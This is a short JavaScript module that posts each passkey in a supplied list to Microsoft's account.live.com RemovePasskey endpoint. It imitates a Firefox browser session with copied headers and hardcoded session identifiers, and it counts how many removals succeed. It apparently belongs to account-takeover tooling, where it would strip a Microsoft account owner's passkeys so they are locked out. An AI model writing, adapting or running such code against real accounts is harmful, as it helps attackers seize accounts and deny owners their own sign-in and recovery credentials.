module.exports = async function removePassKeys(axios, data) {
    const passkeydata = data.passKeys;

    if (!Array.isArray(passkeydata) || passkeydata.length === 0) {
        return 0;
    }

    let successCount = 0;

    console.log(`passkeydata: ${passkeydata}`);

    for (const passkey of passkeydata) {
        const response = await axios.post(
            'https://account.live.com/API/Proofs/RemovePasskey',
            {
                credentialId: passkey.proofId,
                uiflvr: 1001,
                uaid: "52f95f10f21d4ad4908874ee8fce281c",
                scid: 100109,
                hpgid: 201030
            },
            {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0',
                    'Accept': 'application/json',
                    'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Referer': 'https://account.live.com/proofs/manage/additional/',
                    'Content-Type': 'application/json',
                    'x-ms-apiVersion': '2',
                    'x-ms-apiTransport': 'xhr',
                    'uiflvr': '1001',
                    'scid': '100109',
                    'hpgid': '201030',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://account.live.com',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin'
                }
            }
        );

        if (response?.data?.apiCanary) {
            console.log(`Removed passkey!`)
            successCount++;
        }
    }

    return successCount;
}
